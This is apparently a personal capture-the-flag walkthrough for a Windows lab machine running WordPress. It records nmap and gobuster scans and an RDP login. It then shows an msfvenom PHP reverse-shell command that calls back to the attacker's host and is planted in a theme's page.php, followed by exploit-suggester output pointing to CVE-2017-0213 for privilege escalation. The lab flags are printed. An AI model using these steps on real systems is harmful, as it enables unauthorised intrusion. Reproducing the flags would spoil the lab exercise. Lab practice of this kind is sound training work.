```
export IP=10.10.59.6

Nmap
---------------------------------------
nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2020-09-05T15:27:19+00:00
---------------------------------------

Gobuster
---------------------------------------
gobuster -u http://10.10.59.6 -w /usr/share/wordlists/DirBuster-Lists/directory-list-2.3-medium.txt -t 20 -o gobuster_init 

/retro
/Retro
---------------------------------------

Gobuster-retro
---------------------------------------
gobuster -u http://10.10.59.6/retro -w /usr/share/wordlists/DirBuster-Lists/directory-list-2.3-medium.txt -t 20 -o gobuster_wp 

/wp-content (Status: 301)
/wp-includes (Status: 301)
/wp-admin (Status: 301)
---------------------------------------

In /retro, we find user wade and a note he left.(Parzival)
wp-admin => login

Connecting through RDP
user.txt
=====================================
3b99fbdc6d430bfb51c72c651a261927
=====================================

In wordpress, edit the themes
msfvenom -a php --platform php -p php/reverse_php LHOST=10.9.12.130 LPORT=1234 -o shell.php

And copy & paste the conetnts in page.php
Accessing http://$IP/retro/wp-content/themes/90s-retro/page.php gives us our shell

whoami /all

USER INFORMATION
----------------

User Name         SID     
================= ========
nt authority\iusr S-1-5-17


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Group used for deny only                          
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled => let's try this
SeCreateGlobalPrivilege Create global objects                     Enabled

											(or)

Using windows exploit suggester to find the exploit,
python windows-exploit-suggester.py --database 2020-09-06-mssb.xls --systeminfo info.txt --ostext 'windows 10 64-bit' -l 

NOTE : info.txt is retrived from rdp using command systeminfo

[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] getting OS information from command line text
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 1 hotfix(es) against the 160 potential bulletins(s) with a database of 137 known exploits
[*] there are now 160 remaining vulns
[*] searching for local exploits only
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 10 64-bit'
[*] 
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
[*]   https://github.com/foxglovesec/RottenPotato
[*]   https://github.com/Kevin-Robertson/Tater
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
[*] 
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
[*] 
[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
[*] 
[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
[*] 
[*] done

From systeminfo for 10.0.14393 N/A Build 14393 we have exploit CVE-2017-0213.
And executing the file gives us root.txt

root.txt
=======================================
7958b569565d7bd88d10c6f22d1c4063
=======================================
```